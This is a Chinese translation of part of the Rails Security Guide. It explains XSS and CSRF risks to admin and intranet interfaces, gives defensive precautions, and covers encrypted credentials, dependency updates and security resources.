内部网络和管理员安全
---------------------------

内部网络和管理界面是受欢迎的攻击目标，因为它们允许特权访问。尽管这需要几项额外的安全措施，但在现实世界中情况恰恰相反。

2007年，出现了第一个专门针对内部网络的特制木马，即Monster.com的"Monster for employers"网站，这是一个在线招聘网络应用程序。专门定制的木马目前非常罕见，风险相当低，但这确实是一种可能性，也是客户端主机安全性重要性的一个例子。然而，内部网络和管理应用程序面临的最大威胁是XSS和CSRF。

### 跨站脚本攻击

如果您的应用程序从外部网络重新显示恶意用户输入，该应用程序将容易受到XSS攻击。用户名、评论、垃圾邮件报告、订单地址只是一些不常见的例子，其中可能存在XSS漏洞。

如果在管理界面或内部网络中有一个地方没有对输入进行过滤，整个应用程序都会容易受到攻击。可能的攻击包括窃取特权管理员的cookie，注入iframe以窃取管理员的密码，或通过浏览器安全漏洞安装恶意软件以接管管理员的计算机。

有关XSS的对策，请参考注入部分。

### 跨站请求伪造
跨站请求伪造（CSRF），也被称为跨站引用伪造（XSRF），是一种巨大的攻击方法，它允许攻击者执行管理员或内部网络用户可能执行的所有操作。如上所述，您已经了解了CSRF的工作原理，下面是一些攻击者可以在内部网络或管理员界面中执行的示例。

一个现实世界的例子是通过CSRF重新配置[路由器](http://www.h-online.com/security/news/item/Symantec-reports-first-active-attack-on-a-DSL-router-735883.html)。攻击者向墨西哥用户发送了一封带有CSRF的恶意电子邮件。该电子邮件声称用户有一张电子卡等待，但它还包含一个图像标签，导致向用户的路由器发送HTTP-GET请求进行重新配置（该路由器是墨西哥的一种流行型号）。该请求更改了DNS设置，以便将对墨西哥银行网站的请求映射到攻击者的网站。通过该路由器访问银行网站的每个人都会看到攻击者的伪造网站，并且他们的凭据会被窃取。

另一个例子是更改Google Adsense的电子邮件地址和密码。如果受害者已登录Google Adsense，即Google广告活动的管理界面，攻击者可以更改受害者的凭据。

另一个常见的攻击是通过垃圾邮件向您的Web应用程序、博客或论坛传播恶意的XSS。当然，攻击者必须知道URL结构，但大多数Rails的URL都相当直观，或者如果是开源应用程序的管理界面，很容易找到。攻击者甚至可以通过包含恶意的IMG标签进行1,000次幸运猜测，尝试每种可能的组合。

有关管理界面和内部网络应用程序中防御CSRF的措施，请参考CSRF部分中的防御措施。

### 附加预防措施

常见的管理界面工作方式如下：它位于www.example.com/admin，只有在用户模型中设置了管理员标志时才能访问，重新显示用户输入并允许管理员删除/添加/编辑所需的任何数据。以下是一些关于此的思考：

* 非常重要的是要考虑到最坏的情况：如果有人真的获得了您的Cookie或用户凭据，您可以引入管理员界面的角色来限制攻击者的可能性。或者，除了用于应用程序公共部分的凭据之外，还可以使用专门的登录凭据用于管理员界面。或者为非常重要的操作设置一个特殊密码？

* 管理员真的需要从世界各地访问界面吗？考虑限制登录到一组源IP地址。使用request.remote_ip来获取用户的IP地址。这不是绝对安全的，但是是一个很好的屏障。请记住，可能正在使用代理。

* 将管理员界面放在一个特殊的子域中，例如 admin.application.com ，并将其作为一个独立的应用程序具有自己的用户管理。这样，从通常的域名 www.application.com 窃取管理员Cookie就是不可能的。这是因为浏览器的同源策略：在 www.application.com 上注入（XSS）脚本无法读取 admin.application.com 的Cookie，反之亦然。

环境安全
----------------------

本指南的范围不包括如何保护应用程序代码和环境的信息。但是，请确保保护数据库配置，例如`config/database.yml`，`credentials.yml`的主密钥以及其他未加密的机密信息。您可能还希望使用特定于环境的版本来进一步限制访问这些文件以及可能包含敏感信息的其他文件。

### 自定义凭据

Rails将凭据存储在`config/credentials.yml.enc`中，该文件已加密，因此无法直接编辑。Rails使用`config/master.key`或者查找环境变量`ENV["RAILS_MASTER_KEY"]`来加密凭据文件。由于凭据文件已加密，因此可以将其存储在版本控制中，只要主密钥保持安全即可。

默认情况下，凭据文件包含应用程序的`secret_key_base`。它还可以用于存储其他机密，例如外部API的访问密钥。

要编辑凭据文件，请运行`bin/rails credentials:edit`命令。如果凭据文件不存在，此命令将创建凭据文件。此外，如果未定义主密钥，此命令将创建`config/master.key`。

在凭据文件中保存的机密可以通过`Rails.application.credentials`访问。
例如，使用以下解密的`config/credentials.yml.enc`：

```yaml
secret_key_base: 3b7cd72...
some_api_key: SOMEKEY
system:
  access_key_id: 1234AB
```

`Rails.application.credentials.some_api_key`返回`"SOMEKEY"`。`Rails.application.credentials.system.access_key_id`返回`"1234AB"`。
如果您希望在某个键为空时引发异常，可以使用感叹号版本：

```ruby
# 当 some_api_key 为空时...
Rails.application.credentials.some_api_key! # => KeyError: :some_api_key is blank
```

提示：使用 `bin/rails credentials:help` 了解更多有关凭据的信息。

警告：请保护好您的主密钥。不要提交您的主密钥。

依赖管理和 CVEs
----------------

我们不会仅为了鼓励使用新版本而升级依赖项，包括安全问题。这是因为无论我们的努力如何，应用程序所有者都需要手动更新他们的 gem。使用 `bundle update --conservative gem_name` 安全地更新易受攻击的依赖项。

其他资源
--------

安全环境变化很快，保持最新是很重要的，因为错过一个新的漏洞可能是灾难性的。您可以在这里找到有关（Rails）安全性的其他资源：

* 订阅 Rails 安全性 [邮件列表](https://discuss.rubyonrails.org/c/security-announcements/9)。
* [Brakeman - Rails 安全扫描器](https://brakemanscanner.org/) - 用于执行 Rails 应用程序的静态安全分析。
* [Mozilla 的 Web 安全指南](https://infosec.mozilla.org/guidelines/web_security.html) - 关于内容安全策略、HTTP 标头、Cookies、TLS 配置等方面的建议。
* 一个 [优秀的安全博客](https://owasp.org/)，包括 [跨站脚本攻击防御备忘单](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.md)。
[`config.action_controller.default_protect_from_forgery`]: configuring.html#config-action-controller-default-protect-from-forgery
[`csrf_meta_tags`]: https://api.rubyonrails.org/classes/ActionView/Helpers/CsrfHelper.html#method-i-csrf_meta_tags
[`config.filter_parameters`]: configuring.html#config-filter-parameters
[`sanitize_sql`]: https://api.rubyonrails.org/classes/ActiveRecord/Sanitization/ClassMethods.html#method-i-sanitize_sql
[`X-Frame-Options`]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
[`X-Content-Type-Options`]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options
[`Referrer-Policy`]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy
[`Strict-Transport-Security`]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security
[`Content-Security-Policy`]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy
[`Content-Security-Policy-Report-Only`]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy-Report-Only
[`report-uri`]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-uri
[`Feature-Policy`]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Feature-Policy
